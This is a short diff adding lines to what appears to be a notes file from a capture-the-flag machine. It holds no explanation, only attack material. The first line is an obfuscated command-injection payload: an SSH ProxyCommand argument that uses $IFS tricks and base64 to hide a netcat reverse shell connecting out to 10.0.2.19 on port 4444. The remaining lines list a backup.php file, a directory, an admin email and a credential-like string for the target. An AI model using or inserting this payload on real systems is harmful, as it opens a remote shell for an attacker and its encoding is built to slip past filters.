@@ -1,0 +1,7 @@
+x -oProxyCommand=`echo$IFS$()bWtmaWZvIC90bXAvb3NmaWZ0bTsgbmMgMTAuMC4yLjE5IDQ0NDQgMDwvdG1wL29zZmlmdG0gfCAvYmluL3NoID4vdG1wL29zZmlmdG0gMj4mMTsgcm0gL3RtcC9vc2ZpZnRt|base64$IFS$()-d|bash`}
+backup.php
+backups
+1faa/em
+
+admin@pwnhats.htb
+pwnhat:.htb
